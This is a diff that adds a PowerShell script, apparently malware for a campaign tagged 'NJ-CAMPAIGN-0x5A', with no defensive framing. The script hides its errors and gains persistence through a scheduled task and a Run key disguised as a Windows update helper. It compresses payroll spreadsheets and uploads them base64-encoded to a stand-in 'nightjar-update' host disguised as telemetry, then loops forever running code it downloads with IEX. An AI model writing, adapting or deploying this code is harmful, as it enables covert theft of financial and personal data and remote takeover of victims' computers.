@@ -1,0 +1,32 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$Global:NJ = "NJ-CAMPAIGN-0x5A"
+
+function Set-HostPersistence {
+    $n = "WindowsUpdateHelper"
+    $t = "$env:APPDATA\Microsoft\Windows\svchost_helper.ps1"
+    schtasks /Create /SC MINUTE /MO 30 /TN $n /TR "powershell -nop -w hidden -f $t" /F
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+        -Name $n -Value "powershell -nop -w hidden -f $t" -PropertyType String -Force
+}
+
+function Get-Loot {
+    $dst = "$env:TEMP\nj_stage.zip"
+    Compress-Archive -Path "D:\Finance\Payroll\*.xlsx" -DestinationPath $dst -Force
+    $b = [Convert]::ToBase64String([IO.File]::ReadAllBytes($dst))
+    $w = New-Object Net.WebClient
+    $w.Headers.Add("User-Agent","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)")
+    $w.UploadString("http://cdn.nightjar-update.example/api/v2/telemetry", $b)
+}
+
+function Invoke-Beacon {
+    while ($true) {
+        try { IEX ((New-Object Net.WebClient).DownloadString(
+                "http://cdn.nightjar-update.example/api/v2/task")) }
+        catch { }
+        Start-Sleep -Seconds 30
+    }
+}
+
+Set-HostPersistence
+Get-Loot
+Invoke-Beacon
